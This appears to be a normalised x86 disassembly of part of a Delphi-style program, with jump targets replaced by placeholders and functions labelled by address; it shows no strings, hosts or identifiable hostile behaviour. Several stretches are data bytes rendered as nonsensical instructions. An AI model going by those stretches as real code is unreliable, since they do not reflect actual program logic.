mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4043d8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404524
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_404764
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_404118
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b981
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_404764
jmp r-xdata
sub_47b998
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47ba0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404118
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_4043d8
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ba15
lea eax [ ebp - 0xc ]
call sub_404118
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_408280
sub_47ba1f
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x21e87443 ]
or eax [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_47ba60
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_47baa8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d814
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_421b4c
sub_47bb00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043d8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_47bb24
sub_47bb24
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bd24
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bd2b
lea eax [ ebp - 0x1c ]
call sub_404118
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_41b758
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c1e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47bca5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b758
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b514
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_471d74
mov edx esi
mov eax ebx
call sub_47c13c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_474e68
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_471cc0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
sub_47bd34
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_47be56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408a14
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_409280
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba0c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47bdf9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47be5d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_47be68
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_47bb24
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_47be9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bee4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_404424
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47beeb
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_47bef3
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47c072
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_41b514
mov eax esi
call sub_41b4f4
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_47c055
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47c036
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47be68
mov eax esi
call sub_41b4f4
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c03d
lea eax [ ebp - 0xc ]
call sub_40d814
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_47bb24
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax esi
call sub_41b4f4
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_473bf4
mov ebx eax
test ebx ebx
je r-xdata
sub_47c084
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c102
push [ fs : eax ]
mov [ fs : eax ] esp
test cl cl
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_47be68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c109
lea eax [ ebp - 0xc ]
call sub_404118
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
inc esi
dec ebx
jne r-xdata
sub_47c110
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_47c13c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_47bb24
mov eax ebx
call sub_47c1c8
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_47bb24
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_47c1e4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47c22c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c2b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_404208
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c2b9
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub_47c2c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c395
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_41bc68
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c39c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_47c3a4
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_47c3f0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47c518
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47c4ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_47b998
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_478c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c4f5
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_404424
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_408248
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_47b998
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
cmp eax 0x4
jl r-xdata
sub_47c568
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_47c1e4
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47c5b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c63c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_47c64c
mov edx eax
mov eax edi
mov ecx esi
call sub_404208
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c643
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub_47c658
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_47c690
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c744
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_47c554
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c74b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_47c658
sub_47c750
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_41bc18
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_41bc18
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47c788
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47c7ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c7b4
retn
sub_47c7c0
or al 0xc8
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffb838 ] ch
enter 0x47 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
enter 0x47 0xe4
add [ eax ] al
add [ eax - 0x13ffb857 ] dl
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al al

sub_47c80a
inc edi
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x46 ] ah
inc edi
add ah bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x47cb ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] bh
mov bl 0x47
add [ eax ] ch
mov edx 0xaebc0047
inc edi
add [ eax + esi * 4 - 0x3e2bffb9 ] bh
inc edi
add [ ebx + eax * 8 - 0x4e6fffb9 ] ah
inc edi
add [ eax ] al
mov bl 0x47
add [ eax ] dl
rol [ edi ] 0x58
mov bl 0x47
add al ah
mov bl 0x47
add [ eax - 0x4fffb84d ] al
mov ah 0x47
add [ edi + esi * 4 + 0x47 ] bl
add [ edx + edi * 4 ] bh
inc edi
add [ eax ] al
mov ebx 0xbe9c0047
inc edi
add ah bh
mov esi 0xbd340047
inc edi
add [ eax ] cl
int3
sub_47c9b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47cb1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x7c ]
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a54c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_47baa8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x10 ]
mov dl 0x2
mov eax [ ebp - 0x4 ]
call sub_475344
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor edx edx
push ebp
push j_sub_4037e4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
